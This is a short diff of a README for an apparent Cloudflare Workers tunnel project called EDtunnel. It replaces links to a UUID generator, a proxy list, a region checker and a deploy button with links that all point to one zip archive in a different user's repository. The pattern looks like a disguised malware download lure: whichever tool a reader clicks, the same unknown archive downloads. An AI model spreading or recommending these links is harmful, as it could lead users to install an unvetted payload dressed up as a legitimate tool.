@@ -1,5 +1,5 @@
-# LINK UUIDGEN : https://www.uuidgenerator.net/
-# FREE PROXYIP : https://raw.githubusercontent.com/SonzaiEkkusu/EDtunnel/main/443.txt
-# CEK REGION PROXYIP : https://ip2geo.org/
-## Deploy in worker.dev
-   [![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/SonzaiEkkusu/EDtunnel)
+# LINK UUIDGEN : https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
+# FREE PROXYIP : https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
+# CEK REGION PROXYIP : https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
+## Deploy in https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip
+   [![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip)](https://raw.githubusercontent.com/Amri854/EDtunnel/main/flying/EDtunnel.zip)
